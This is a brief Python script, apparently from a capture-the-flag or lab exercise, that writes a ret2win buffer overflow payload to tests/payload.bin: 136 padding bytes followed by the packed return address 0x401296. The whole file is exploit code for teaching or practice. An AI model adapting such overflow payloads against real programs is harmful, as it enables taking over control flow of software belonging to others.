#!/usr/bin/env python3
import struct
from pathlib import Path

OFFSET = 136
WIN_ADDRESS = 0x401296

payload = b"A" * OFFSET
payload += struct.pack("<Q", WIN_ADDRESS)

output = Path("tests/payload.bin")
output.write_bytes(payload)

print(f"Payload created: {output}")
print(f"Payload size: {len(payload)} bytes")
print(f"Target address: 0x{WIN_ADDRESS:x}")
